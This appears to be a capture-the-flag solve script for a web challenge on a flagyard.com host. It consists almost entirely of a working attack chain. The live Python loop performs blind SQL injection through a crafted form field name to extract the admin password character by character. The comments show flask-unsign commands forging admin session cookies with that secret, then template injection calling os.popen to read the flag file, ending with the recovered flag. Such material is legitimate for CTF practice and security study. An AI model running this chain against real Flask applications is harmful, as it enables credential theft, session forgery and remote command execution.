import requests
dictionary = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!$?#@~%&()*+,-./:;<=>[\\]^_`{|}"

res="ILIKEpotatoesSOMUCH"
i=19

while i < 30 : 
    for   c in dictionary : 
        data = {
        f"SUBSTR(password,{i},1)='{c}' and username='admin' or username": "ouxs",
        "password": "ouxs",
    }
        response = requests.post('http://a27c5855a620fc3603f17.playat.flagyard.com/', data=data, verify=False)
        out=response.text
        

        if 'Invalid credentials' in out :
            print(res+c) 
        else : 
            res+=c
            i+=1
            break

# while i < 30 : 
#     for   c in dictionary : 
#         data = {
#         f"SUBSTR(password,{i},1)='{c}' and username='admin' or username": "ouxs",
#         "password": "ouxs",
#     }
#         response = requests.post('http://a27c5855a620fc3603f17.playat.flagyard.com/', data=data, verify=False)
#         out=response.text
        

#         if 'Invalid credentials' in out :
#             print(res+c) 
#         else : 
#             res+=c
#             i+=1
#             break

## Password : ILIKEpotatoesSOMUCH::&&


# └─$ flask-unsign --sign --cookie "{'type': 'admin'}" --secret 'ILIKEpotatoesSOMUCH::&&'
# eyJ0eXBlIjoiYWRtaW4ifQ.ZSPdPA.8WN71E5EK0MTtHe2WuqMLm8ckCc

#  flask-unsign --sign --cookie "{'type': '{{7*7}}'}" --secret 'ILIKEpotatoesSOMUCH::&&'
# eyJ0eXBlIjoie3s3Kjd9fSJ9.ZSPeCA.GtwwnA3YhcRbk3H6BTrFcqxSXFc

# flask-unsign -s  --secret 'ILIKEpotatoesSOMUCH::&&' --cookie "{'type':'{{cycler.init.globals.os.popen("cat /flag_086bf2851588e4e353fecee934635e09.txt").read()}}'}"

# BHFlagY{cea89f2c50591b9f907dda3d29b7244b}
